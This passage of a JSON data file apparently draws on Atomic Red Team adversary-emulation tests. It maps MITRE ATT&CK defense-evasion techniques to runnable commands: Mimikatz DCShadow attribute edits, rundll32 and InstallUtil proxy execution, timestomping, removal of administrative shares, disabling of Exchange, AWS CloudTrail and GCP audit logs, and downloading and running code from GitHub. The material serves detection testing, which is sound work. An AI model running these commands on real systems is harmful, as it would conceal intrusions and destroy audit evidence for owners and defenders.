            "description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)\n",
            "command": "copy %windir%\\System32\\calc.exe not_an_scr.scr && rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr"
         },
         {
            "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n",
            "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"4c870d_T1218.011_DefaultInstall.inf\""
         }
      ]
   },
   "T1207": {
      "technique_name": "Rogue Domain Controller",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
            "command": "$dc_output_file = \"PathToAtomicsFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"; Remove-Item $dc_output_file -ErrorAction Ignore; $mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"; $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\"; Start-Sleep -Seconds 5; & \"#{mimikatz_path}\" \"lsadump::dcshadow /push\" \"exit\"; Write-Host \"`nWaiting for fake DC server to return\"; Wait-Process $dc; Write-Host \"`nOutput from fake DC server:\"; Get-Content $dc_output_file; Start-Sleep 1; Remove-Item $dc_output_file -ErrorAction Ignore; Write-Host \"End of DCShadow\""
         }
      ]
   },
   "T1027.004": {
      "technique_name": "Obfuscated Files or Information: Compile After Delivery",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is contained in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n",
            "command": "Invoke-Expression \"C:\\Users\\puma-4\\Desktop\\893687_T1027.004_DynamicCompile.exe\""
         },
         {
            "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n",
            "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1027.004.exe \"af2f1c_calc.cs\""
         },
         {
            "description": "Compile a c file with either gcc or clang on Linux or Macos.\n",
            "command": "if [ -e  e9248b_T1027-004-test.c ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O \"e9248b_T1027-004-test.c\"; fi;  ;  gcc e9248b_T1027-004-test.c && ./a.out; clang e9248b_T1027-004-test.c && ./a.out"
         },
         {
            "description": "Compile a c file with either gcc or clang on Linux or Macos.\n",
            "command": "if [ -e  d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc -O d7822f_T1027-004-test.cc; fi;  ;  g++ d7822f_T1027-004-test.cc && ./a.out; clang++ d7822f_T1027-004-test.cc && ./a.out"
         },
         {
            "description": "Compile a c file with either gcc or clang on Linux or Macos.\n",
            "command": "if [ -e  a932ec_T1027-004-test.go ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O a932ec_T1027-004-test.go; fi;  ;  go run a932ec_T1027-004-test.go"
         }
      ]
   },
   "T1070.006": {
      "technique_name": "Indicator Removal on Host: Timestomp",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n",
            "command": "import-module \"C:\\Users\\puma-4\\Desktop\\timestomp.ps1\"; timestomp -dest \"C:\\Users\\puma-4\\Desktop\\kxwn.lock\""
         },
         {
            "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n",
            "command": "Get-ChildItem \"C:\\Users\\puma-4\\Desktop\\T1551.006_timestomp.txt\" | % { $_.LastAccessTime = \"01/01/1970 00:00:00\" }"
         },
         {
            "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n",
            "command": "Get-ChildItem \"C:\\Users\\puma-4\\Desktop\\T1551.006_timestomp.txt\" | % { $_.CreationTime = \"01/01/1970 00:00:00\" }"
         },
         {
            "description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n",
            "command": "NOW=$(date +%m%d%H%M%Y); date 010100001971; touch /tmp/T1070.006-creation.txt; date \"$NOW\"; stat /tmp/T1070.006-creation.txt"
         },
         {
            "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n",
            "command": "Get-ChildItem \"C:\\Users\\puma-4\\Desktop\\T1551.006_timestomp.txt\" | % { $_.LastWriteTime = \"01/01/1970 00:00:00\" }"
         }
      ]
   },
   "T1562.009": {
      "technique_name": "Impair Defenses: Safe Boot Mode",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Allows adversaries to abuse safe mode to disable endpoint defenses that may not start with limited boot",
            "command": "bcdedit /set safeboot network"
         }
      ]
   },
   "T1070.005": {
      "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Removes a Network Share utilizing the command_prompt\n",
            "command": "net share \\\\test\\share /delete"
         },
         {
            "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, \u201cMissing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
            "command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete"
         },
         {
            "description": "Add a Network Share utilizing the command_prompt\n",
            "command": "net use c: \\\\test\\share && net share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No"
         },
         {
            "description": "Removes a Network Share utilizing PowerShell\n",
            "command": "Remove-SmbShare -Name \\\\test\\share; Remove-FileShare -Name \\\\test\\share"
         },
         {
            "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled as is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
            "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f && reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f"
         }
      ]
   },
   "T1564.003": {
      "technique_name": "Hide Artifacts: Hidden Window",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "The following Atomic Red Team test leverages the Chrome headless browser to access a mockbin site. Create your own Mockbin.org site and replace the BIN in the inputs.\nThe default Mockbin ID forwards to google.com and you may view the details here https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec/view.\nReference: https://cert.gov.ua/article/5702579\n",
            "command": "start \"\" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec"
         },
         {
            "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n",
            "command": "Start-Process powershell.exe -WindowStyle hidden calc.exe"
         }
      ]
   },
   "T1218.004": {
      "technique_name": "Signed Binary Proxy Execution: InstallUtil",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n",
            "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
         },
         {
            "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n",
            "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'CheckIfInstallable'; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
         },
         {
            "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
            "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
         },
         {
            "description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n",
            "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"; $InstallerAssemblyFileName = 'readme.txt'; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"readme.txt\"; $ExpectedOutput = 'Constructor_'; Set-Location \"$Env:windir\\System32\\Tasks\"; Copy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine;     InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
         },
         {
            "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n",
            "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'InstallHelper';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
         },
         {
            "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n",
            "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_HelpText_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
         },
         {
            "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
            "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Install_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
         },
         {
            "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
            "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Uninstall_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }"
         }
      ]
   },
   "T1221": {
      "technique_name": "Template Injection",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n",
            "command": "start \"01b633_Calculator.docx\""
         }
      ]
   },
   "T1562.008": {
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.\nUnified or Admin Audit logs are disabled via the Exchange Powershell cmdline.\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml\n",
            "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False"
         },
         {
            "description": "This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n",
            "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.vpc-remove-flow-logs; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force"
         },
         {
            "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n",
            "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-event-selectors; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force"
         },
         {
            "description": "GCP provides 4 types of Cloud Audit Logs: Admin Activity, Data Access, System Events, and Policy Denied.\nAn adversary may attempt to delete logs in order to hide their activity. However, Admin Activity, System Events, and Policy Deny events logs cannot be deleted. \n\nThis Atomic attempts to delete the Activity Event log. An event is generated under the method name of `google.logging.v2.LoggingServiceV2.DeleteLog` with a Serverity of `ERROR`.\n",
            "command": "gcloud config set project atomic-project-1; gcloud logging logs delete projects/atomic-project-1/logs/cloudaudit.googleapis.com%2Factivity --quiet"
         },
         {
            "description": "This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n",
            "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force"
         },
         {
            "description": "Identifies an Event Hub deletion in Azure.\nAn Event Hub is an event processing service that ingests and processes large volumes of events and data.\nAn adversary may delete an Event Hub in an attempt to evade detection.\nhttps://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.\n",
            "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd; Connect-AzureAD -Credential $creds; Remove-AzEventHub -ResourceGroupName"
         },
         {
            "description": "Use Exchange Management Shell to Mailbox auditing to bypass. It will prevent any mailbox audit logging entries being generated for the target e-mail box.\nhttps://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation?view=exchange-ps\n",
            "command": "$secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-MailboxAuditBypassAssociation -Identity \"o365_email_test\" -AuditBypassEnabled $true"
         },
         {
            "description": "Creates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail\n",
            "command": "if [ -f \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/terraform.tfstate\" ]; then : ; else cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/\"; terraform init; terraform apply -auto-approve; fi;  ;  aws cloudtrail update-trail --name redatomictesttrail --s3-bucket-name redatomic-test  --is-multi-region-trail --region us-east-1; aws cloudtrail stop-logging --name redatomictesttrail --region us-east-1; aws cloudtrail delete-trail --name redatomictesttrail --region us-east-1"
         }
      ]
   },
   "T1070": {
      "technique_name": "Indicator Removal on Host",
      "tactic": "defense-evasion",
      "known implementations": [
         {
